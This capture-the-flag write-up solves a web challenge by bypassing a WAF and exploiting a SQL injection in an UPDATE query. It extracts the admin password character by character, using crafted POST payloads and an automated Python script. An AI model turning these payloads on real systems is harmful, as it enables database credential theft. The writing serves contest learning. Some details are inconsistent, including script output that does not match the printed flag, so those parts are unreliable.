## 77777 2 (Web, 208pt)

> Contestants won't influence each other while solving the challenge.
> 
> http://47.52.137.90:20000

The task was quite similar to [../77777-104/README.md](77777) with some small differences.

The About tab has changed a bit.

```
U can update my points in Profile.

and And the flag is `admin's pw`:)
```

The `update_point()` function remains exactly the same but we guess that the `waf()` function is less permissive this time.

```php
function update_point($p, $points){
    global $link;
    $q = sprintf("UPDATE users SET points=%d%s, $p, waf($points)");
    if(!$query = mysqli_query($link, $q)) return FALSE;
    return TRUE;
}
if(!update_point($_POST['flag'], $_POST['hi']))
    echo 'sorry';
```

Fuzzing the `waf()` for character limitations, we see that only the following characters are allowed:

```
[+]  0, 1, 6, 7, 8
[+]  a-z (not 'j')
[+]  A-Z (not 'J')
[+]  " # $ ' ( ) * + , - . : ; > ? @ [ \ ] _ { | }
[+]  \s
```

Some MySQL functions have also been restricted. What took more time in this challenge, was to realize that the column name that we had to extract was `pw` and not `password` as before (see About tab). After realing this, we issued the following request to determine password length.

```
POST / HTTP/1.1
Host: 47.75.14.48
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Connection: close

flag=1&hi=*length( pw )
```

The `waf()` function did not allow the `pw` keyword to be prefixed or followed by any characters apart from whitespaces. So, we put spaces before and after, to bypass it.

Knowing the length and having bypassed the `pw` filtering, we can retrieve full password using a payload such as:

```
flag=1&hi=*convert(hex(substr( pw ,BINARY_INDEX,1)),signed)
```

The solution is automated in the [solve.py](solve.py) script.

```python
import re
import requests

_target = 'http://47.52.137.90:20000/'

def extract_points(html):
    return re.search(r'<grey>My Points</grey> \| ([0-9]+)<br/>', html).group(1).strip()

def get_pw_len():
    d = {'flag': '1', 'hi': '*length( pw )'}
    resp = requests.post(_target, data=d)
    return int(extract_points(resp.text))

flag = ''
for i in range(1,get_pw_len()+1):
    d = {'flag': '1', 'hi': '*convert(hex(substr( pw ,0b{0:b},1)),signed)'.format(i)}
    resp = requests.post(_target, data=d)
    flag += chr(int(extract_points(resp.text), 16))
    print flag

print '[+] flag: N1CTF{{{}}}'.format(flag)
```

```
❯❯❯ python solve.py
h
ha
hah
haha
hahah
hahah7
hahah77
hahah777
hahah777a
hahah777a7
hahah777a7a
hahah777a7ah
hahah777a7aha
hahah777a7aha7
hahah777a7aha77
hahah777a7aha777
hahah777a7aha7777
hahah777a7aha77777
hahah777a7aha77777a
hahah777a7aha77777aa
hahah777a7aha77777aaa
hahah777a7aha77777aaaa
[+] flag: N1CTF{helloctfer23333}
```
